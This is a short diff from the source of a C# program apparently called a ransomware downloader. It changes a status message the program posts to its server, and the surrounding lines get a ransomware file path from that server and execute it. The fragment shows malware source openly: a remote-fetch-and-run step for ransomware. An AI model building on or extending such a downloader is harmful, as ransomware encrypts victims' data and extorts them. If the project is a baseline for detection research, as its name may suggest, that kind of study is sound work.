@@ -43,7 +43,7 @@ namespace BaseLineRansomwareDownloader
             Thread.Sleep(100);
 
             //Posts to the server that it has been fetched by ransomware, this marks the ransomware in the 
-            serverCommunicator.postBaseFetched();
+            serverCommunicator.postBaseStarted();
 
             //Starts the ransomware
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
